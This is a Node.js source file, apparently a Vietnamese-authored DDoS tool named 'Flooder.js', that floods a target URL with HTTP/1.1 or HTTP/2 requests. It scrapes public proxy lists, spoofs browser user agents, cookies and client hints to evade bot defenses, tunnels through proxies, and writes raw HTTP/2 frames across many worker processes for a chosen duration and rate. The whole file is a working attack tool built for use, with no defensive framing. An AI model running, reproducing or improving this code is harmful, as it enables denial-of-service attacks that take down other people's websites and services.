const http2 = require('http2');
const http = require('http');
const net = require('net');
const fs = require('fs');
const chalk = require('chalk');
const setTitle = require('node-bash-title');
const cluster = require('cluster');
const tls = require('tls');
const HPACK = require('hpack');
const crypto = require('crypto');
const axios = require('axios');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError', 'DeprecationWarning'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT', 'DEP0123', 'ERR_SSL_WRONG_VERSION_NUMBER'];

const browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
const devices = [
    "Windows NT 10.0; Win64; x64", "Windows NT 11.0; Win64; x64",
    "Macintosh; Intel Mac OS X 10_15_7", "Macintosh; Intel Mac OS X 11_6_8",
    "X11; Linux x86_64", "Linux; Android 13", "Linux; Android 14",
    "iPhone; CPU iPhone OS 17_0 like Mac OS X", "iPhone; CPU iPhone OS 17_4 like Mac OS X",
    "iPad; CPU OS 17_0 like Mac OS X", "iPad; CPU OS 17_4 like Mac OS X"
];
const versions = {
    Chrome: ['124.0.0.0', '125.0.0.0', '126.0.0.0', '127.0.0.0', '128.0.0.0', '129.0.0.0', '130.0.0.0'],
    Firefox: ['124.0', '125.0', '126.0', '127.0', '128.0', '129.0'],
    Safari: ['16.6', '17.0', '17.1', '17.2', '17.3', '17.4', '18.0'],
    Edge: ['124.0.0.0', '125.0.0.0', '126.0.0.0', '127.0.0.0', '128.0.0.0', '129.0.0.0', '130.0.0.0'],
    Opera: ['106.0.0.0', '107.0.0.0', '108.0.0.0', '109.0.0.0', '110.0.0.0', '111.0.0.0', '112.0.0.0']
};

const cookieNames = ['sessionid', 'csrftoken', 'userid', 'theme', 'lang', 'auth_token', 'sid', '_ga', '_gid', '_gat'];

function randomHex(len = 16) {
    return Array.from({ length: len }, () => Math.floor(Math.random() * 16).toString(16)).join('');
}

function generateRandomCookie() {
    const name = cookieNames[Math.floor(Math.random() * cookieNames.length)];
    let value = '';
    switch (name) {
        case 'sessionid': value = 's%3A' + randomHex(24) + '.' + randomHex(8); break;
        case 'csrftoken': value = randomHex(32); break;
        case 'userid': value = Math.floor(Math.random() * 1e9).toString(); break;
        case 'theme': value = Math.random() > 0.5 ? 'dark' : 'light'; break;
        case 'lang': value = ['en', 'vi', 'fr', 'de', 'es'][Math.floor(Math.random() * 5)]; break;
        case 'auth_token': value = randomHex(40); break;
        case 'sid': value = randomHex(16); break;
        case '_ga': value = `GA1.2.${Math.floor(Math.random() * 1e9)}.${Math.floor(Date.now() / 1000)}`; break;
        case '_gid': value = `GA1.2.${Math.floor(Math.random() * 1e9)}.${Math.floor(Date.now() / 1000)}`; break;
        case '_gat': value = '1'; break;
    }
    return `${name}=${value}`;
}

let sessionCookies = [];
function initCookies() {
    const count = Math.floor(Math.random() * 3) + 2; // 2-4 cookies
    sessionCookies = Array.from({ length: count }, () => generateRandomCookie());
}

function getCookieHeader() {
    return sessionCookies.join("; ");
}

const args = process.argv.slice(2);
const options = {
    cookies: args.includes('-cookie'),
    headfull: args.includes('-fullbrowser'),
    version: args.includes('-ver') ? args[args.indexOf('-v') + 1] : '2',
    cache: args.includes('-cache') ? args[args.indexOf('-cache') + 1] === 'true' : true,
    debug: !args.includes('-s')
};

const proxyList = [
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
    'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt',
    'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
    'http://worm.rip/http.txt',
    'https://proxyspace.pro/http.txt',
    'https://proxy-spider.com/api/proxies.example.txt1',
    'http://193.200.78.26:8000/http?key=free'
];

async function scrapeProxies() {
    const file = "proxy.txt";
    try {
        if (fs.existsSync(file)) {
            fs.unlinkSync(file);
            if (options.debug) console.log(chalk.red(`File ${file} đã bị xóa!\n`) + chalk.yellow(`Đang làm mới proxy...\n`));
        }
        for (const proxy of proxyList) {
            try {
                const response = await axios.get(proxy, { timeout: 5000 });
                fs.appendFileSync(file, response.data);
            } catch (err) {
                continue;
            }
        }
        const total = fs.readFileSync(file, 'utf-8').split('\n').length;
        if (options.debug) console.log(`${chalk.white(`( ${chalk.yellow(total)} ${chalk.white(')')} ${chalk.green('Proxy đã được thu thập/làm mới.')}`)}`);
    } catch (err) {
        if (options.debug) console.log(chalk.red('Lỗi khi thu thập proxy'));
        process.exit(1);
    }
}

function generateUserAgent() {
    const browser = browsers[Math.floor(Math.random() * browsers.length)];
    const device = devices[Math.floor(Math.random() * devices.length)];
    const version = versions[browser][Math.floor(Math.random() * versions[browser].length)];
    const isMobile = device.includes('Android') || device.includes('iPhone') || device.includes('iPad');
    const chromeVersion = versions.Chrome[Math.floor(Math.random() * versions.Chrome.length)];
    const safariVersion = versions.Safari[Math.floor(Math.random() * versions.Safari.length)];

    let ua = '';
    if (isMobile) {
        if (device.includes('Android')) {
            ua = `Mozilla/5.0 (${device}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion} Mobile Safari/537.36`;
        } else {
            ua = `Mozilla/5.0 (${device}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${safariVersion} Mobile/15E148 Safari/604.1`;
        }
    } else {
        switch (browser) {
            case 'Chrome': ua = `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36`; break;
            case 'Firefox': ua = `Mozilla/5.0 (${device}; rv:${version}) Gecko/20100101 Firefox/${version}`; break;
            case 'Safari': ua = `Mozilla/5.0 (${device}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${safariVersion} Safari/605.1.15`; break;
            case 'Edge': ua = `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36 Edg/${version}`; break;
            case 'Opera': ua = `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36 OPR/${version}`; break;
        }
    }
    return ua;
}

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);
process.emitWarning = () => {};

process
    .on('uncaughtException', (e) => ignoreCodes.includes(e.code) || ignoreNames.includes(e.name) ? false : console.error(e))
    .on('unhandledRejection', (e) => ignoreCodes.includes(e.code) || ignoreNames.includes(e.name) ? false : console.error(e))
    .on('warning', (e) => ignoreCodes.includes(e.code) || ignoreNames.includes(e.name) ? false : console.error(e))
    .on('SIGHUP', () => 1)
    .on('SIGCHILD', () => 1);

if (process.argv[2] === 'scrape') {
    console.clear();
    scrapeProxies();
    return;
}

if (process.argv.length < 7) {
    console.clear();
    console.log(`
@VinhNguyen

Cách sử dụng:
node Flooder.js [url] [time] [proxy] [threads] [rate] [cookie] [fullbrowser] [ver] 

Giải thích tham số:
  [url]                 - URL mục tiêu, ví dụ https://example.com/
  [time]                - Thời gian tấn công (giây)
  [threads]             - Số luồng
  [rate]                - Tốc độ yêu cầu của mỗi luồng
  [proxy]               - Máy chủ proxy (host:port) hoặc đường dẫn file danh sách proxy
  [cookie]              - Chuỗi Cookie
  [fullbrowser]         - Kích hoạt chế độ trình duyệt đầy đủ
  [ver]                 - HTTP 1 / hoặc HTTP 2
    `);
    process.exit(1);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const threads = parseInt(process.argv[5]);
const rate = parseInt(process.argv[6]);

let proxies = [];
let proxy = [];

try {
    proxies = fs.readFileSync(proxyFile, 'utf-8').toString().split('\n').filter(p => p.length > 0);
    proxy = proxies;
} catch (e) {
    if (options.debug) console.log(chalk.red('Không tìm thấy proxy'));
    process.exit(1);
}

let stats = { requests: 0, goaway: 0, success: 0, forbidden: 0, errors: 0, proxyConnections: 0 };
let statusesQ = [];
let statuses = {};
let proxyConnections = 0;
let isFull = process.argv.includes('--full');
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const url = new URL(target);
const custom_table = 65535;
const custom_window = 6291456;
const custom_header = 262144;
const custom_update = 15663105;

function colorizeStatus(status, count) {
    const greenStatuses = ['200', '404'];
    const redStatuses = ['403', '429'];
    const yellowStatuses = ['503', '502', '522', '520', '521', '523', '524'];
    let coloredStatus = greenStatuses.includes(status) ? chalk.green.bold(status) :
                        redStatuses.includes(status) ? chalk.red.bold(status) :
                        yellowStatuses.includes(status) ? chalk.yellow.bold(status) :
                        chalk.gray.bold(status);
    return `${coloredStatus}: ${chalk.underline(count)}`;
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    return payload.length > 0 ? Buffer.concat([frame, payload]) : frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUint8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;
    let payload = Buffer.alloc(0);

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
        if (payload.length + offset !== length) return null;
    }

    return { streamId, length, type, flags, payload };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    return Buffer.concat([frameHeader, Buffer.alloc(4).fill(0)]);
}

function buildRequest() {
    const userAgent = generateUserAgent();
    const accept = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                   'application/json, text/plain, */*;q=0.8',
                   'text/html,application/xhtml+xml,*/*;q=0.9'][Math.floor(Math.random() * 3)];
    const acceptEncoding = ['gzip, deflate, br', 'gzip, deflate', 'br'][Math.floor(Math.random() * 3)];
    const acceptLanguage = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'vi-VN,vi;q=0.9,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9'][Math.floor(Math.random() * 5)];
    const priority = ['u=0, i', 'u=1', 'u=2'][Math.floor(Math.random() * 3)];
    const referer = ['https://' + url.hostname + '/', 'https://' + url.hostname + url.pathname, 'https://www.google.com/', 'https://www.bing.com/'][Math.floor(Math.random() * 4)];

    let headers = `GET ${url.pathname}${Math.random() > 0.5 ? '?' + randomHex(8) : ''} HTTP/1.1\r\n` +
        `Host: ${url.hostname}\r\n` +
        `User-Agent: ${userAgent}\r\n` +
        `Accept: ${accept}\r\n` +
        `Accept-Language: ${acceptLanguage}\r\n` +
        `Accept-Encoding: ${acceptEncoding}\r\n` +
        `Cache-Control: ${options.cache ? 'max-age=0' : 'no-cache'}\r\n` +
        `Connection: keep-alive\r\n` +
        `Upgrade-Insecure-Requests: 1\r\n` +
        `Referer: ${referer}\r\n` +
        `DNT: 1\r\n` +
        `Sec-Fetch-Dest: document\r\n` +
        `Sec-Fetch-Mode: navigate\r\n` +
        `Sec-Fetch-Site: ${referer.includes(url.hostname) ? 'same-origin' : 'cross-site'}\r\n` +
        `Sec-Fetch-User: ?1\r\n` +
        `Priority: ${priority}\r\n` +
        `TE: trailers\r\n`;

    if (options.cookies) headers += `Cookie: ${getCookieHeader()}\r\n`;
    headers += `sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="${versions.Chrome[Math.floor(Math.random() * versions.Chrome.length)]}", "Google Chrome";v="${versions.Chrome[Math.floor(Math.random() * versions.Chrome.length)]}"\r\n` +
        `sec-ch-ua-mobile: ${devices.some(d => d.includes('Android') || d.includes('iPhone') || d.includes('iPad')) ? '?1' : '?0'}\r\n` +
        `sec-ch-ua-platform: "${devices[Math.floor(Math.random() * devices.length)].includes('Windows') ? 'Windows' : devices[Math.floor(Math.random() * devices.length)].includes('Macintosh') ? 'macOS' : 'Linux'}"\r\n\r\n`;

    return Buffer.from(headers, 'binary');
}

const http1Payload = Buffer.concat([buildRequest()]);

function go() {
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');

    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        stats.errors++;
        setTimeout(go, 100);
        return;
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            proxyConnections++;
            stats.proxyConnections++;
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: options.version === '1' ? ['http/1.1'] : ['h2', 'http/1.1'],
                servername: url.hostname,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384',
                secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3,
                minVersion: 'TLSv1',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol === 'http/1.1' || options.version === '1') {
                    function doWrite() {
                        if (tlsSocket.destroyed) {
                            setTimeout(go, 100);
                            return;
                        }
                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) {
                                stats.requests++;
                                setTimeout(doWrite, isFull ? 1000 : 1000 / rate);
                            } else {
                                stats.errors++;
                                tlsSocket.end(() => tlsSocket.destroy());
                                setTimeout(go, 100);
                            }
                        });
                    }
                    doWrite();
                    return;
                }

                let streamId = 1;
                let data = Buffer.alloc(0);
                const hpack = new HPACK();
                hpack.setTableSize(4096);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(custom_update, 0);

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_header],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_table]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);
                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type === 4 && frame.flags === 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1));
                            }
                            if (frame.type === 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] === ':status')?.[1];
                                if (status) {
                                    if (status === '403' || status === '400') {
                                        stats.forbidden++;
                                    } else if (status === '200' || status === '404') {
                                        stats.success++;
                                    }
                                    if (!statuses[status]) statuses[status] = 0;
                                    statuses[status]++;
                                }
                            }
                            if (frame.type === 7 || frame.type === 5) {
                                if (frame.type === 7) {
                                    stats.goaway++;
                                    if (!statuses['GOAWAY']) statuses['GOAWAY'] = 0;
                                    statuses['GOAWAY']++;
                                }
                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.end(() => tlsSocket.destroy());
                                setTimeout(go, 100);
                            }
                        } else {
                            break;
                        }
                    }
                });

                tlsSocket.on('error', (err) => {
                    stats.errors++;
                    tlsSocket.end(() => tlsSocket.destroy());
                    setTimeout(go, 100);
                });

                tlsSocket.write(Buffer.concat(frames));

                function doWrite() {
                    if (tlsSocket.destroyed) {
                        setTimeout(go, 100);
                        return;
                    }

                    const userAgent = generateUserAgent();
                    const accept = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                                   'application/json, text/plain, */*;q=0.8',
                                   'text/html,application/xhtml+xml,*/*;q=0.9'][Math.floor(Math.random() * 3)];
                    const acceptEncoding = ['gzip, deflate, br', 'gzip, deflate', 'br'][Math.floor(Math.random() * 3)];
                    const acceptLanguage = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'vi-VN,vi;q=0.9,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9'][Math.floor(Math.random() * 5)];
                    const priority = ['u=0, i', 'u=1', 'u=2'][Math.floor(Math.random() * 3)];
                    const referer = ['https://' + url.hostname + '/', 'https://' + url.hostname + url.pathname, 'https://www.google.com/', 'https://www.bing.com/'][Math.floor(Math.random() * 4)];

                    let headers = [
                        [':method', 'GET'],
                        [':authority', url.hostname],
                        [':scheme', 'https'],
                        [':path', url.pathname + (Math.random() > 0.5 ? '?' + randomHex(8) : '')],
                        ['user-agent', userAgent],
                        ['accept', accept],
                        ['accept-encoding', acceptEncoding],
                        ['accept-language', acceptLanguage],
                        ['cache-control', options.cache ? 'max-age=0' : 'no-cache'],
                        ['priority', priority],
                        ['referer', referer],
                        ['sec-fetch-dest', 'document'],
                        ['sec-fetch-mode', 'navigate'],
                        ['sec-fetch-site', referer.includes(url.hostname) ? 'same-origin' : 'cross-site'],
                        ['sec-fetch-user', '?1'],
                        ['upgrade-insecure-requests', '1'],
                        ['te', 'trailers']
                    ];

                    if (options.cookies) headers.push(['cookie', getCookieHeader()]);
                    if (options.headfull) {
                        headers = headers.concat([
                            ['sec-ch-ua', `"Not_A Brand";v="8", "Chromium";v="${versions.Chrome[Math.floor(Math.random() * versions.Chrome.length)]}", "Google Chrome";v="${versions.Chrome[Math.floor(Math.random() * versions.Chrome.length)]}"`],
                            ['sec-ch-ua-mobile', devices.some(d => d.includes('Android') || d.includes('iPhone') || d.includes('iPad')) ? '?1' : '?0'],
                            ['sec-ch-ua-platform', devices[Math.floor(Math.random() * devices.length)].includes('Windows') ? '"Windows"' : devices[Math.floor(Math.random() * devices.length)].includes('Macintosh') ? '"macOS"' : '"Linux"']
                        ]);
                    }

                    const packed = Buffer.concat([
                        Buffer.from([0x80, 0, 0, 0, 0xFF]),
                        hpack.encode(headers)
                    ]);

                    tlsSocket.write(encodeFrame(streamId, 1, packed, 0x25), (err) => {
                        if (!err) {
                            stats.requests++;
                            setTimeout(doWrite, 1000 / rate);
                        } else {
                            stats.errors++;
                            tlsSocket.end(() => tlsSocket.destroy());
                            setTimeout(go, 100);
                        }
                    });
                    streamId += 2;
                }

                doWrite();
            });
        });

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });

    netSocket.on('error', (err) => {
        stats.errors++;
        netSocket.destroy();
        setTimeout(go, 100);
    });
}

if (cluster.isMaster) {
    console.clear();
    if (options.debug) {
        console.log(`[>] Target: `.yellow + target.cyan);
        console.log(`[>] Time: `.magenta + duration.toString().cyan + ' seconds');
        console.log(`[>] Rate: `.blue + rate.toString().cyan + ' req/s');
        console.log(`[>] Threads: `.red + threads.toString().cyan);
        console.log(`[>] ProxyFile: ${proxyFile.cyan} | Total: ${proxy.length.toString().cyan}`);
        console.log(`Attack Launched @VinhNguyen`.cyan);
    }

    const workers = {};
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % require('os').cpus().length }));

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % require('os').cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message];
    });

    if (options.debug) {
        setInterval(() => {
            let statuses = {};
            let totalConnections = 0;
            for (let w in workers) {
                if (workers[w][0].state === 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (code !== 'proxyConnections') {
                                if (statuses[code] == null) statuses[code] = 0;
                                statuses[code] += st[code];
                            }
                        }
                        totalConnections += st.proxyConnections || 0;
                    }
                }
            }
            const statusString = Object.entries(statuses).map(([status, count]) => colorizeStatus(status, count)).join(', ');
            console.clear();
            console.log(`[${chalk.magenta.bold('POWER/VinhNguyen')}] | Date: [${chalk.blue.bold(new Date().toLocaleString('en-US'))}] | Status: [${statusString}] | ProxyConnect: [${chalk.cyan.bold(totalConnections)}]`);
            proxyConnections = 0;
        }, 1000);
    }

    setTimeout(() => {
        if (options.debug) console.log(chalk.red('Attack Done'));
        process.exit(0);
    }, duration * 1000);
} else {
    initCookies();
    setInterval(go, 1000 / rate);

    if (options.debug) {
        setInterval(() => {
            if (statusesQ.length >= 4) statusesQ.shift();
            statusesQ.push({ ...statuses, proxyConnections });
            statuses = {};
            proxyConnections = 0;
            process.send(statusesQ);
        }, 250);
    }

    setTimeout(() => process.exit(0), duration * 1000);
}